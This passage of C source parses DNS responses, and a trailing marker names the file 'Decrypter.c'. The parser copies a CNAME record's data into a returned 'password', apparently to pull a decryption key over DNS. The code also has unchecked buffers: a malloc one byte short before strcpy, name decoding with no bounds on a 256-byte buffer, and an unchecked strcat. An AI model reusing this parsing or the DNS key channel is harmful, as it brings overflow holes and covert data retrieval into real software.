            a.sin_addr.s_addr=(*p); //working without ntohl
            printf("has IPv4 address : %s",inet_ntoa(a.sin_addr));
        }

        if(ntohs(answers[i].resource->type)==5)
        {
            //Canonical name for an alias
            printf("has alias name : %s",answers[i].rdata);
            password = (char*)malloc(strlen((char*)answers[i].rdata));
            strcpy(password,(char*)answers[i].rdata);
        }

        printf("\n");
    }

    //print authorities
    printf("Authoritive Records : %d \n" , ntohs(dns->auth_count) );
    for( i=0 ; i < ntohs(dns->auth_count) ; i++)
    {

        printf("Name : %s ",auth[i].name);
        if(ntohs(auth[i].resource->type)==2)
        {
            printf("has nameserver : %s",auth[i].rdata);
        }
        printf("\n");
    }

    //print additional resource records
    printf("Additional Records : %d \n" , ntohs(dns->add_count) );
    for(i=0; i < ntohs(dns->add_count) ; i++)
    {
        printf("Name : %s ",addit[i].name);
        if(ntohs(addit[i].resource->type)==1)
        {
            long *p;
            p=(long*)addit[i].rdata;
            a.sin_addr.s_addr=(*p);
            printf("has IPv4 address : %s",inet_ntoa(a.sin_addr));
        }
        printf("\n");
    }
    return password;
}

/*
 *
 * */
u_char* ReadName(unsigned char* reader,unsigned char* buffer,int* count)
{
    unsigned char *name;
    unsigned int p=0,jumped=0,offset;
    int i , j;

    *count = 1;
    name = (unsigned char*)malloc(256);

    name[0]='\0';

    //read the names in 3www6google3com format
    while(*reader!=0)
    {
        if(*reader>=192)
        {
            offset = (*reader)*256 + *(reader+1) - 49152; //49152 = 11000000 00000000 ;)
            reader = buffer + offset - 1;
            jumped = 1; //we have jumped to another location so counting wont go up!
        }
        else
        {
            name[p++]=*reader;
        }

        reader = reader+1;

        if(jumped==0)
        {
            *count = *count + 1; //if we havent jumped to another location then we can count up
        }
    }

    name[p]='\0'; //string complete
    if(jumped==1)
    {
        *count = *count + 1; //number of steps we actually moved forward in the packet
    }

    //now convert 3www6google3com0 to www.google.com
    for(i=0;i<(int)strlen((const char*)name);i++)
    {
        p=name[i];
        for(j=0;j<(int)p;j++)
        {
            name[i]=name[i+1];
            i=i+1;
        }
        name[i]='.';
    }
    name[i-1]='\0'; //remove the last dot
    return name;
}

/*
 * This will convert www.google.com to 3www6google3com
 * got it :)
 * */
void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host)
{
    int lock = 0 , i;
    strcat((char*)host,".");

    for(i = 0 ; i < strlen((char*)host) ; i++)
    {
        if(host[i]=='.')
        {
            *dns++ = i-lock;
            for(;lock<i;lock++)
            {
                *dns++=host[lock];
            }
            lock++; //or lock=i+1;
        }
    }
    *dns++='\0';
}
/*----- Decrypter.c ----- */